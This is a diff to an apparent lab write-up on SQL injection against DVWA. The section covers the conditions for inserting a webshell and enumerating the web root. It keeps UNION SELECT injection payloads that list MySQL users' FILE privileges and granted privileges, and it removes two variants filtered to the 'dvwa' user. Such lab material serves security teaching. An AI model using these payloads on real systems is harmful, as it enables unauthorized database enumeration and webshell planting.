@@ -87,11 +87,7 @@ These are the required conditions to insert a webshell.
 ```sql
 ' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv) FROM mysql.user#
 
-' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv) FROM mysql.user WHERE File_priv = 'Y' AND user = 'dvwa'#
-
 ' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES#
-
-' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SELECT' OR PRIVILEGE_TYPE OR 'FILE' AND GRANTEE LIKE "'dvwa'%"#
 ```
 
 ### 4.2.3 - Web Root Enumeration
